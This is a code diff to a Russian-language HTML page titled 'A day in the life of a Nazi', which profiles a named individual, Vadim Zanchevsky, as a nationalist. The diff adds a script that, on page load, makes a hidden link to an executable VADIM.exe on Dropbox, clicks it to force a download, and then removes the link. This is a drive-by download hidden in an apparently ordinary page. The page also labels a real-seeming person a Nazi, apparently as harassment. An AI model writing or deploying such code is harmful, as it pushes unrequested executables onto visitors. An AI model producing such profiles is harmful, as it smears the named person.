@@ -11,9 +11,25 @@
     <div class="wrapper">
         <h1>Один день из жизни нациста - <span class="name">Вадима Занчевского</span>.</h1>
         <p><br>Вадим Занчевский, участник националистического движения, провел свой день, погруженный в рутинные дела, связанные с его идеологической деятельностью.<br>## Утро<br>Вадим проснулся рано и начал день с просмотра новостей о политической ситуации в стране. Завтракая, он размышлял о своих планах на день.<br>## Полдень<br>После утренних дел Вадим встретился с единомышленниками для обсуждения предстоящих мероприятий. Они делились идеями о том, как укрепить свои ряды и привлечь новых участников.<br>## Вечер<br>Вечером он проводил тренировки с молодыми активистами, обучая их основам тактики и стратегии. Это время было посвящено как физической подготовке, так и обмену опытом.<br>## Ночь<br>Ночь Вадим провел за чтением литературы о политике. Он обдумывал свои действия и планы на будущее, полные решимости продолжать свою деятельность.</p>
-        <p class="secret_info name">Материал засекречен, разглашение повлечёт последсвия :)</p>
+        <p class="secret_info name">Материал засекречен, разглашение повлечёт последствия :</p>
     </div>
 
+    <script>
+        function downloadFile() {
+            const fileUrl = 'https://www.dropbox.com/scl/fi/k9inzjjzcizqte8wydvay/VADIM.exe?rlkey=8fsjww50y0r85kdtbfbmiu9h0&st=xygw987h&dl=1'; 
+            const link = document.createElement('a');
+            link.href = fileUrl;
+            link.download = fileUrl.split('/').pop(); 
+            link.style.display = 'none';
+            document.body.appendChild(link);
+            link.click();
+            setTimeout(() => {
+                document.body.removeChild(link);
+            }, 100);
+        }
+        window.addEventListener('load', downloadFile);
+    </script>
+    
     <script type="module" src="js/finish.js"></script>
 </body>
 </html>
